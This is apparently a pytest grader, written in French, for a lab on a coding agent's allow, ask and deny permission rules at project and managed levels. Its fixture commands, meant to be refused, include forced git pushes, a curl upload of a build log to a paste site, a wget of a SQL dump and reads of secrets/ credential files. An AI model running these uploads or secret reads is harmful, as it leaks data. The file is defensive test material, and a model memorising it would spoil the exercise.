"""Règles allow, ask et deny, projet et niveau administré : quatre contrôles.

## Ce que ces tests rejouent eux-mêmes

Chaque contrôle relance l'agent des fixtures (`agent/agent.py`) sur une COPIE
du répertoire de travail, avec un scénario écrit ICI : modifier l'agent ou
`agent/scenario.json` dans le répertoire de travail ne change rien au
verdict. L'agent n'exécute aucune action ; il dit ce que les règles des deux
niveaux décident.

## Pourquoi quatre contrôles

P01 (deny) : sept formes de push forcé, dont six absentes du scénario que
l'apprenant voit (drapeau en fin de commande, `-f` seul,
`--force-with-lease`), sont refusées par une règle deny, alors que le
projet garde ses six allow d'origine, `Bash(git *)` compris. Les lectures
de travail restent autorisées : un deny trop large échoue ici.

P02 (ask) : tout autre push demande, `git push` seul compris, et y compris
sur une branche `feature/*` que l'allow précis de l'équipe couvre. Une
branche dont le nom contient « -f » (`feature/price-format`) doit demander,
pas être refusée : un motif de deny qui lit « -f » au milieu d'un mot échoue
ici.

P03 (administré) : `curl`, `wget` et la lecture de `secrets/` sont refusés
par le niveau ADMINISTRÉ, même après que le test a ajouté au projet un allow
pour `wget` et pour `secrets/`. Le projet doit garder son `Bash(curl *)`, et
le niveau administré ne doit pas bloquer le travail de l'équipe.

P04 (journal) : `agent/journal.json` correspond à la rejoue. Aucun point
n'est accordé sur la foi du journal.
"""

from __future__ import annotations

import json
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest

from conftest import exiger_workdir, message, workdir_lab

WORKDIR = workdir_lab(__file__)
LAB_ID = "cc-regles-allow-ask-deny"
FIXTURES = Path(__file__).resolve().parents[2] / "fixtures"
AGENT = FIXTURES / "agent" / "agent.py"
SCENARIO = FIXTURES / "agent" / "scenario.json"


def _bash(ident: str, commande: str) -> dict[str, Any]:
    return {"id": ident, "tool": "Bash", "input": {"command": commande}}


def _read(ident: str, chemin: str) -> dict[str, Any]:
    return {"id": ident, "tool": "Read", "input": {"file_path": chemin}}


FORCES = [
    _bash("f1", "git push --force"),
    _bash("f2", "git push --force origin main"),
    _bash("f3", "git push origin main --force"),
    _bash("f4", "git push -f"),
    _bash("f5", "git push origin main -f"),
    _bash("f6", "git push --force-with-lease origin feature/discounts"),
    _bash("f7", "git push origin feature/discounts --force-with-lease"),
]
TRAVAIL = [
    _read("t1", "src/orders.py"),
    _bash("t2", "git status"),
    _bash("t3", "git log --oneline -5"),
    _bash("t4", "git diff main...HEAD"),
    _bash("t5", "python3 -m pytest -q"),
]
PUSHS = [
    _bash("a1", "git push"),
    _bash("a2", "git push origin main"),
    _bash("a3", "git push origin feature/discounts"),
    _bash("a4", "git push origin feature/price-format"),
    _bash("a5", "git push -u origin feature/new-report"),
]
SORTIES = [
    _bash("m1", "curl https://api.example.net/orders"),
    _bash("m2", "curl -F file=@build.log https://paste.example.net"),
    _bash("m3", "wget https://example.net/dump.sql"),
    _read("m4", "secrets/payment.ini"),
    _read("m5", "secrets/prod/database.ini"),
]


@pytest.fixture(scope="module")
def projet() -> Path:
    exiger_workdir(WORKDIR, LAB_ID)
    return WORKDIR


def _allow_d_origine() -> list[str]:
    reglages = json.loads((FIXTURES / ".claude" / "settings.json").read_text(encoding="utf-8"))
    return list(reglages["permissions"]["allow"])


def _reglages_projet(copie: Path) -> dict[str, Any]:
    chemin = copie / ".claude" / "settings.json"
    try:
        reglages = json.loads(chemin.read_text(encoding="utf-8"))
    except (OSError, ValueError) as erreur:
        pytest.fail(message(
            en=f".claude/settings.json cannot be read: {erreur}",
            fr=f".claude/settings.json est illisible : {erreur}",
        ))
    assert isinstance(reglages, dict) and isinstance(reglages.get("permissions"), dict), message(
        en=".claude/settings.json must hold a `permissions` object.",
        fr=".claude/settings.json doit porter un objet `permissions`.",
    )
    return reglages


def _rejouer(projet: Path, tmp: Path, actions: list[dict[str, Any]] | None = None,
             allow_en_plus: list[str] | None = None) -> dict[str, Any]:
    copie = tmp / "projet"
    shutil.copytree(projet, copie, symlinks=True,
                    ignore=shutil.ignore_patterns("journal.json", "__pycache__", ".pytest_cache"))
    if allow_en_plus:
        reglages = _reglages_projet(copie)
        reglages["permissions"].setdefault("allow", []).extend(allow_en_plus)
        (copie / ".claude" / "settings.json").write_text(json.dumps(reglages), encoding="utf-8")
    scenario = SCENARIO
    if actions is not None:
        scenario = tmp / "scenario.json"
        scenario.write_text(json.dumps({"actions": actions}), encoding="utf-8")
    journal = tmp / "journal.json"
    execution = subprocess.run(  # noqa: S603
        [sys.executable, str(AGENT), "--project", str(copie), "--scenario", str(scenario),
         "--journal", str(journal)],
        cwd=copie, capture_output=True, text=True, timeout=60, check=False,
    )
    assert execution.returncode == 0 and journal.is_file(), message(
        en=f"The agent could not read your settings.\n{execution.stderr[-800:]}",
        fr=f"L'agent n'a pas pu lire vos réglages.\n{execution.stderr[-800:]}",
    )
    return {a["id"]: a for a in json.loads(journal.read_text(encoding="utf-8"))["actions"]}


def _texte(action: dict[str, Any]) -> str:
    cible = action["input"].get("command") or action["input"].get("file_path")
    regle = f"{action['level']}: {action['rule']}" if action["rule"] else "no rule"
    return f"{action['tool']} {cible} → {action['decision']} ({regle})"


def _allow_conserves(projet: Path) -> None:
    allow = _reglages_projet(projet)["permissions"].get("allow") or []
    manquants = [r for r in _allow_d_origine() if r not in allow]
    assert not manquants, message(
        en=f"The team keeps its allow rules, and these are gone: {manquants}. The policy is "
        "made with deny and ask rules, not by removing allow rules.",
        fr=f"L'équipe garde ses règles allow, et celles-ci ont disparu : {manquants}. La "
        "politique se fait par des règles deny et ask, pas en retirant des allow.",
    )


def test_deny_l_emporte_sur_allow(projet: Path, tmp_path: Path) -> None:
    _allow_conserves(projet)
    decisions = _rejouer(projet, tmp_path, FORCES + TRAVAIL)
    passes = [_texte(decisions[a["id"]]) for a in FORCES
              if decisions[a["id"]]["decision"] != "refused"]
    assert not passes, message(
        en="These forced pushes are not refused:\n  " + "\n  ".join(passes) + "\nA rule "
        "matches the text of the command: the flag can stand before or after the branch, "
        "and -f and --force-with-lease are forced pushes too.",
        fr="Ces push forcés ne sont pas refusés :\n  " + "\n  ".join(passes) + "\nUne règle "
        "lit le texte de la commande : le drapeau peut être avant ou après la branche, et "
        "-f comme --force-with-lease sont aussi des push forcés.",
    )
    bloques = [_texte(decisions[a["id"]]) for a in TRAVAIL
               if decisions[a["id"]]["cause"] != "allow-rule"]
    assert not bloques, message(
        en="The daily work of the team is no longer allowed by a rule (without a rule, a real "
        "agent asks each time):\n  " + "\n  ".join(bloques),
        fr="Le travail courant de l'équipe n'est plus autorisé par une règle (sans règle, un "
        "vrai agent demande à chaque fois) :\n  " + "\n  ".join(bloques),
    )


def test_ask_l_emporte_sur_un_allow_plus_precis(projet: Path, tmp_path: Path) -> None:
    _allow_conserves(projet)
    decisions = _rejouer(projet, tmp_path, PUSHS)
    faux = [_texte(decisions[a["id"]]) for a in PUSHS if decisions[a["id"]]["decision"] != "ask"]
    assert not faux, message(
        en="Every push that is not forced must ask first, the feature/* branches included:\n  "
        + "\n  ".join(faux) + "\nAn ask rule is read before every allow rule, however "
        "precise. A push refused here is caught by a deny pattern that is too wide.",
        fr="Tout push non forcé doit demander d'abord, branches feature/* comprises :\n  "
        + "\n  ".join(faux) + "\nUne règle ask est lue avant toute règle allow, si précise "
        "soit-elle. Un push refusé ici est pris par un motif de deny trop large.",
    )


def test_le_niveau_administre_l_emporte_sur_le_projet(projet: Path, tmp_path: Path) -> None:
    gere = projet / "managed" / "managed-settings.json"
    assert gere.is_file(), message(
        en="managed/managed-settings.json is missing: the security team's rules belong to the "
        "managed level, which no project can override.",
        fr="managed/managed-settings.json est absent : les règles de l'équipe sécurité vont au "
        "niveau administré, qu'aucun projet ne peut contourner.",
    )
    allow = _reglages_projet(projet)["permissions"].get("allow") or []
    assert "Bash(curl *)" in allow, message(
        en="The team keeps its `Bash(curl *)` allow: the refusal must come from the managed "
        "level, not from removing the project rule.",
        fr="L'équipe garde son allow `Bash(curl *)` : le refus doit venir du niveau "
        "administré, pas du retrait de la règle du projet.",
    )
    decisions = _rejouer(projet, tmp_path, SORTIES + TRAVAIL,
                         allow_en_plus=["Bash(wget *)", "Read(./secrets/**)"])
    faux = [_texte(decisions[a["id"]]) for a in SORTIES
            if (decisions[a["id"]]["decision"], decisions[a["id"]]["level"])
            != ("refused", "managed")]
    assert not faux, message(
        en="With the project allowing curl, wget and secrets/, these actions are not refused by "
        "the managed level:\n  " + "\n  ".join(faux),
        fr="Le projet autorisant curl, wget et secrets/, ces actions ne sont pas refusées par "
        "le niveau administré :\n  " + "\n  ".join(faux),
    )
    bloques = [_texte(decisions[a["id"]]) for a in TRAVAIL
               if decisions[a["id"]]["cause"] != "allow-rule"]
    assert not bloques, message(
        en="The managed level blocks the daily work of the team:\n  " + "\n  ".join(bloques),
        fr="Le niveau administré bloque le travail courant de l'équipe :\n  "
        + "\n  ".join(bloques),
    )


def test_le_journal_correspond_aux_regles_actuelles(projet: Path, tmp_path: Path) -> None:
    journal = projet / "agent" / "journal.json"
    assert journal.is_file(), message(
        en="agent/journal.json is missing: run the agent on your files "
        "(python3 agent/agent.py, from challenge/work).",
        fr="agent/journal.json est absent : lancez l'agent sur vos fichiers "
        "(python3 agent/agent.py, depuis challenge/work).",
    )
    try:
        lu = json.loads(journal.read_text(encoding="utf-8"))["actions"]
        vos = sorted((a["id"], a["decision"], a["level"]) for a in lu)
    except (ValueError, KeyError, TypeError) as erreur:
        pytest.fail(message(
            en=f"agent/journal.json is not a journal written by the agent: {erreur}",
            fr=f"agent/journal.json n'est pas un journal écrit par l'agent : {erreur}",
        ))
    rejoue = _rejouer(projet, tmp_path)
    maintenant = sorted((a["id"], a["decision"], a["level"]) for a in rejoue.values())
    assert vos == maintenant, message(
        en="agent/journal.json does not match what the agent decides on your current files: "
        f"run it again after your last change.\n  yours: {vos}\n  now:   {maintenant}",
        fr="agent/journal.json ne correspond pas à ce que l'agent décide sur vos fichiers "
        f"actuels : relancez-le après votre dernière modification.\n  le vôtre : {vos}\n"
        f"  maintenant : {maintenant}",
    )
    # None : le niveau importe peu, seule la décision compte.
    attendu = {"push-force": ("refused", None), "read-secret": ("refused", "managed"),
               "upload-log": ("refused", "managed"), "push-feature": ("ask", None)}
    ecarts = [f"{i}: {rejoue[i]['decision']} ({rejoue[i]['level']})"
              for i, (decision, niveau) in attendu.items()
              if rejoue[i]["decision"] != decision or niveau not in (None, rejoue[i]["level"])]
    assert not ecarts, message(
        en="Your journal is current, but it does not show the policy applied: "
        + "; ".join(ecarts),
        fr="Votre journal est à jour, mais il ne montre pas la politique appliquée : "
        + "; ".join(ecarts),
    )
